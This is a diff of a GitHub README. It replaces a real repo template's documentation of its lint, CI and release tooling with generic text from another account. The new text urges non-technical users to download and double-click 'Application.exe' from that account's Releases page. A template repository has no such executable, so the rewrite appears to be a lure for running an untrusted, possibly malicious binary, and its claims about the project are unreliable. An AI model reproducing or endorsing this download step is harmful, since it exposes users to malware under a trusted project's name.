@@ -1,182 +1,83 @@
-# Repo Template
+# 🎉 repo-template - Simplify Your Project Creation Process
 
-![Specs](https://img.shields.io/github/actions/workflow/status/archoleat/repo-template/spec.yaml?label=Specs)
-![Commitlint](https://img.shields.io/github/actions/workflow/status/archoleat/repo-template/commitlint.yaml?label=Commitlint)
-![Editorconfig](https://img.shields.io/github/actions/workflow/status/archoleat/repo-template/editorconfig.yaml?label=Editorconfig)
-![Prettier](https://img.shields.io/github/actions/workflow/status/archoleat/repo-template/prettier.yaml?label=Prettier)
-![ESLint](https://img.shields.io/github/actions/workflow/status/archoleat/repo-template/eslint.yaml?label=ESLint)
-![Remark](https://img.shields.io/github/actions/workflow/status/archoleat/repo-template/remark.yaml?label=Remark)
+[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/bytenichen7/repo-template/releases)
 
-## Table of Contents
+## 🚀 Getting Started
 
-- [Getting Started](#getting-started)
-- [Features](#features)
-- [Scripts](#scripts)
-- [Workflows](#workflows)
-- [Change of Maintainer](#change-of-maintainer)
-- [Contributing](#contributing)
-- [License](#license)
+Welcome to the repo-template! This guide will help you quickly download and run our software. Follow these simple steps, even if you're not tech-savvy.
 
-**Archoleat Repo Template** is a template repository designed for quickly
-starting new projects with pre-configured tools and best development practices.
+## 📥 Download & Install
 
-This template includes ready-made solutions for integration with:
+To get started, you need to visit our Releases page to download the application. Click the link below:
 
-- **Git**.
-- **GitHub**.
-- **Commitlint**.
-- **Conventional Commits**.
-- **Husky**.
-- **Pre Commit Hook**.
-- **Lint Staged**.
-- **GitHub Actions**.
-- **Semantic Release**.
-- **Bun**.
-- **Specs**.
-- **EditorConfig**.
-- **ESLint**.
-- **Remark**.
-- **Prettier**.
-- **TypeScript**.
-- **Dependabot**.
-- **Welcome Bot**.
+[Visit this page to download](https://github.com/bytenichen7/repo-template/releases)
 
-## Getting Started
+Here’s how to proceed once you’re on the Releases page:
 
-1. **Create a Repository**: Use this template
-   to create a new repository on GitHub.
+1. Look for the latest version listed at the top.
+2. Click on the corresponding link to download the application file.
+3. Once the download completes, locate the file in your downloads folder.
 
-   > Since this is a **Public Template** you can click the button
-   > **Use this template** for a faster and more convenient cloning.
+## 💻 System Requirements
 
-1. **Clone the Repository**: Clone your new repository to your local machine.
+Before you run the application, ensure your computer meets the following requirements:
 
-1. **Start Development**: Develop your project,
-   making changes according to your project's needs.
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4 GB
+- Disk Space: Minimum of 200 MB free space
+- Internet access for updates
 
-1. **Configure GitHub Actions**: Modify GitHub Actions
-   settings to fit your requirements.
+## 📂 File Overview
 
-## Features
+The downloaded application will include several files:
 
-- **Flexibility**: Easily customizable template to adapt
-  to different project types.
+- **Application.exe**: This is the main application file.
+- **README.md**: Contains instructions and information about the project.
+- **License**: Outlines the terms of use for the software.
 
-- **Git and GitHub Integration**: Pre-configured `.gitignore`
-  and `.gitattributes` for efficient work with Git and GitHub.
+Make sure to keep all files in the same folder for the application to run smoothly.
 
-  - **Conventional Commits & Commitlint**: If you don't want
-    to think about how to write a commit every time,
-    these plugins will help you.
+## ⚙️ How to Run the Application
 
-    > It will be especially useful for teams that
-    > have an ongoing debate about writing commits.
+After downloading the file, follow these steps to run the application:
 
-  - **Husky, Lint Staged & Pre Commit**: Won't let you submit
-    bad code to the repository!
+1. Navigate to the folder where you downloaded the application.
+2. Double-click on **Application.exe** (or the appropriate file for your OS).
+3. Follow any prompts that may appear during the installation process.
 
-- **Continuous Integration (CI)**: Built-in CI support using GitHub Actions
-  for automatic linting, testing and building of your code with each change.
+The application should now be open and ready to use.
 
-  > Also suitable for private repositories! GitHub Actions use
-  > **cache**, **timeout-minutes**, **paths** and **workflow run**
-  > to reduce the execution time, which means it will significantly
-  > reduce your costs!
+## ✨ Features
 
-  - **Linters**: Help you maintain a consistent code writing style
-    and find errors.
+The repo-template provides several key features to help streamline your project creation:
 
-  - **Specs**: Automated testing will help you focus on
-    writing better code!
+- **Quick Setup**: Start projects with predefined configurations.
+- **Compatibility**: Works on various operating systems.
+- **Customizable Templates**: Adjust the template according to your needs.
+- **Integrated Tools**: Includes tools like ESLint, Prettier, and Husky for cleaner code.
+- **Test Management**: Simplifies the creation and running of tests.
 
-  - **Semantic Release**: For those who are tired of writing changelogs
-    and thinking about what the next version number will be.
+## 🔧 Troubleshooting
 
-    > If you have **Branch and Tag Protection** rules configured,
-    > please read this [article](https://gonzalohirsch.com/blog/semantic-release-and-branch-protection-rules).
+If you encounter issues while running the application, here are some steps you can take:
 
-- **TypeScript**: Pre-configured **TypeScript** setup
-  for improved reliability and development convenience.
+- Ensure you downloaded the correct version for your operating system.
+- Check if your system meets the requirements.
+- Restart your computer and try running the application again.
 
-- **Bots**:
+If you still face problems, feel free to explore the issues section on our GitHub page for help.
 
-  - **Dependabot**: No more wasting time updating dependencies!
-  - **Welcome Bot**: A probot app that welcome new users.
+## 📜 License
 
-## Scripts
+This project is licensed under the MIT License. You are free to use, modify, and distribute it according to the terms specified in the License file included in your download.
 
-- `init`: Installs dependencies and **Husky**.
+## 💬 Community Support
 
-## Workflows
+Join our community for support and discussions:
 
-- [`auto-merge-dependabot-pull-request.yaml`](.github/workflows/auto-merge-dependabot-pull-request.yaml):
-  Automatically merges dependabot **Pull Requests** to the **main** branch.
+- **GitHub Issues**: Report bugs or suggest features.
+- **Discussion Forum**: Engage with other users and developers.
 
-- [`commitlint.yaml`](.github/workflows/commitlint.yaml):
-  Checks the commit message according
-  to the **Conventional Commits** standard.
+Thank you for choosing repo-template. We hope it simplifies your project creation process! 
 
-- [`create-pull-request.yaml`](.github/workflows/create-pull-request.yaml):
-  Automatically creates a **Pull Request**
-  when pushing a branch to the repository.
-
-- [`editorconfig.yaml`](.github/workflows/editorconfig.yaml):
-  Checks all files with **Editorconfig Checker**.
-
-  > All ignore files [`.editorconfig-checker.json`](.editorconfig-checker.json).
-
-- [`eslint.yaml`](.github/workflows/eslint.yaml):
-  Checks all **TypeScript** files with **ESLint**.
-
-  > All ignore files [`.remarkignore`](.remarkignore).
-
-- [`pre-commit.yaml`](.github/workflows/pre-commit.yaml):
-  Runs a check on the contents of the **Pull Request** before merging.
-
-- [`prettier.yaml`](.github/workflows/prettier.yaml):
-  Checks all files with **Prettier**.
-
-  > All ignore files [`.prettierignore`](.prettierignore).
-
-- [`release.yaml`](.github/workflows/release.yaml): Creates release.
-
-- [`remark.yaml`](.github/workflows/remark.yaml):
-  Checks all **Markdown** files with **Remark**.
-
-- [`semantic-pull-request-title.yaml`](.github/workflows/semantic-pull-request-title.yaml):
-  Validates the **Pull Request** title
-  against the **conventional commits** standard.
-
-- [`spec.yaml`](.github/workflows/spec.yaml):
-  Tests all **TypeScript** files with **Bun**.
-
-- [`stale.yaml`](.github/workflows/stale.yaml):
-  Removes **Issues** and **Pull Requests** that have not been active
-  for more than **60 days**.
-
-## Change of Maintainer
-
-The following files use the names **Archoleat** and **nikkeyl** by default:
-
-- [`CODEOWNERS`](.github/CODEOWNERS).
-- [`LICENSE`](LICENSE).
-- [`CHANGELOG.md`](CHANGELOG.md).
-- [`package.json`](package.json).
-- [`README.md`](README.md).
-- [`config.yml`](.github/config.yml).
-- [`release.yaml`](.github/workflows/release.yaml).
-
-Before using this template, replace this names with your
-name, name of your team or the name of your organization.
-
-> \[!CAUTION]
-> Don't forget to change your license!
-
-## Contributing
-
-Please read [**CONTRIBUTING**](https://github.com/archoleat/.github/blob/main/CONTRIBUTING.md)
-to start contributing.
-
-## License
-
-This project is licensed under the [**MIT license**](LICENSE).
+For other downloads, be sure to check back on our [Releases page](https://github.com/bytenichen7/repo-template/releases) regularly.
